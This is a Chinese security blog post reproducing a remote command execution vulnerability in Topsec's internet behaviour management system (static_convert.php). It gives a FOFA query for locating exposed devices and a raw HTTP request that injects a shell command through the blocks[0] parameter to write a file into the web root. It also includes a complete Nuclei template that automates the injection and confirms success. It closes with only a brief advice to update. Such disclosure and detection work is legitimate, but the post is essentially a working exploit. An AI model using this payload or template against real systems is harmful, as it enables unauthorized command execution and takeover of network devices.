#  【漏洞复现】天融信TOPSEC static_convert 远程命令执行   
原创 rain  知黑守白   2024-01-04 00:01  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
**此内容仅供技术交流与学习，请勿用于未经授权的场景。请遵循相关法律与道德规范。任何因使用本文所述技术而引发的法律责任，与本文作者及发布平台无关。如有内容争议或侵权，请及时私信我们！**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞概述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
天融信TOPSEC Static_Convert存在严重的远程命令执行漏洞。攻击者通过发送精心构造的恶意请求，利用了该漏洞，成功实现在目标系统上执行任意系统命令的攻击。成功利用漏洞的攻击者可在目标系统上执行恶意操作，可能导致数据泄露、系统瘫痪或远程控制。强烈建议立即更新系统以修复此漏洞，确保系统安全性。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3dia4gYTJl6QvZJs0wYBwoR8EEXXR9eV5ZpBjwtGoAKfuHWwZ8gXWwMSQTuZ7bCvha9j1ibN96ajUA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
FoFa  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
```
app="天融信-上网行为管理系统"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'123'%20>%20/var/www/html/qxijtj.txt%0A HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3dia4gYTJl6QvZJs0wYBwoR6FagE4aFv40mdbAmJ4XZCicrUccLqmlAiaUrPNib7uAP3SgbEiaE4IrHPQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3dia4gYTJl6QvZJs0wYBwoRyHUwI6yEnD47WIeicrQyFvOgfiaA0bNTibAMX0Szuzaq4fG4ic8YnMCbog/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
Nuclei Poc  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
```
id: topsec-static_convert-rce

info:
  name: 天融信TOPSEC-static_convert-远程命令执行漏洞
  author: rain
  severity: critical
  metadata:
    fofa-query: app="天融信-上网行为管理系统"
variables:
  file_name: "{{to_lower(rand_text_alpha(6))}}"
  file_content: "{{to_lower(rand_text_alpha(15))}}"
requests:
  - raw:
      - |+
        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'{{file_content}}'%20>%20/var/www/html/{{file_name}}.txt%0A HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
      - |
        GET /{{file_name}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body_2, '{{file_content}}')"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
修复建议  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
更新至最新版本：确保你的系统版本处于最新状态。厂商通常会发布包含安全修复的更新，及时应用这些更新以确保系统的安全性。  
  
